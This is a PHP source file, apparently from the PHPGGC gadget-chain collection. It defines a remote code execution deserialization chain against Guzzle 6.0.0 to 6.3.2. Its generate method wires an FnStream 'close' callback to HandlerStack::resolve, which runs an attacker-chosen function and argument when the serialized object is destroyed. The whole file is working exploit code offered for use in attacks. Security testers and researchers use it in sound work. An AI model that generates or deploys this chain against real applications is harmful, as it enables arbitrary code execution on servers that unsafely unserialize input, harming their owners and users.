<?php

namespace GadgetChain\Guzzle;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '6.0.0 <= 6.3.2';
    public static $vector = '__destruct';
    public static $author = 'proclnas';
    public static $information = '
        This chain requires GuzzleHttp\Psr7 < 1.5.0, because FnStream cannot be
        deserialized afterwards.
        See https://github.com/ambionics/phpggc/issues/34
    ';


    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \GuzzleHttp\Psr7\FnStream([
            'close' => [
                new \GuzzleHttp\HandlerStack($function, $parameter),
                'resolve'
            ]
        ]);
    }
}
